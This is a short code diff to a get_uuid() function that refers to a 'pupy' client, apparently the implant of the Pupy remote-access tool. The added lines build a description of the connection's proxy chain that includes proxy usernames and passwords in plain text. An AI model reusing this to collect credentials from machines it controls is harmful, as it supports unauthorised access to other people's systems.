@@ -378,12 +378,28 @@ def get_uuid():
     proxy = None
     try:
         from network.lib.proxies import LAST_PROXY, has_wpad
-        if LAST_PROXY:
+        if hasattr(pupy, 'client') and pupy.client.connection_info.get(
+                'proxies', []):
+            try:
+                proxy = ' -> '.join(
+                    '{}://{}{}'.format(
+                        proxy.type,
+                        '{}:{}@'.format(
+                            proxy.username, proxy.password
+                        ) if proxy.username or proxy.password else '',
+                        proxy.addr
+                    ) for proxy in pupy.client.connection_info['proxies']
+                )
+            except Exception as e:
+                proxy = str(e)
+
+        elif LAST_PROXY:
             proxy = tuple([
                 x for x in LAST_PROXY if x
             ])
         elif has_wpad:
             proxy = 'wpad'
+
     except ImportError:
         proxy = None
 
